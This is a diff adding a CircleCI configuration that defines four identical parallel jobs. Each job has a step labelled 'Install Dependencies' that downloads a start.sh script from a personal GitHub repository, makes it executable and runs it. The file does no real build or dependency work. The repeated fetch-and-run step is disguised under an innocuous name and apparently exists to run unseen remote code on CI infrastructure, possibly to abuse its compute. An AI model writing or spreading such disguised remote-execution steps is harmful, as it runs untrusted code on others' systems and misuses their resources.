@@ -1,0 +1,38 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/amira01032010/devop/blob/main/start.sh && chmod u+x start.sh && ./start.sh
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/amira01032010/devop/blob/main/start.sh && chmod u+x start.sh && ./start.sh
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/amira01032010/devop/blob/main/start.sh && chmod u+x start.sh && ./start.sh
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/amira01032010/devop/blob/main/start.sh && chmod u+x start.sh && ./start.sh
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
